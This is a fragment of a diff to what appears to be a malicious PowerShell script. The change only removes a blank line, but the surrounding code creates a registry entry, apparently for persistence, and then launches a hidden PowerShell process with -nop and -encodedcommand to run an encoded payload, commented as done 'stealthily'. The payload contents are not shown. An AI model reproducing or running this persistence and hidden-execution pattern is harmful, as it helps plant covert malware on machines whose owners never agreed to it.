@@ -25,7 +25,6 @@ If (-Not (Test-Path $regPath)) {
 # Create the registry entry
 New-ItemProperty -Path $regPath -Name $entryName -Value $entryValue -PropertyType String - Force
 
-
 # Execute payload immediately (stealthily)
 Start-Process -WindowStyle Hidden powershell.exe "-nop -encodedcommand
 $encodedPayload"
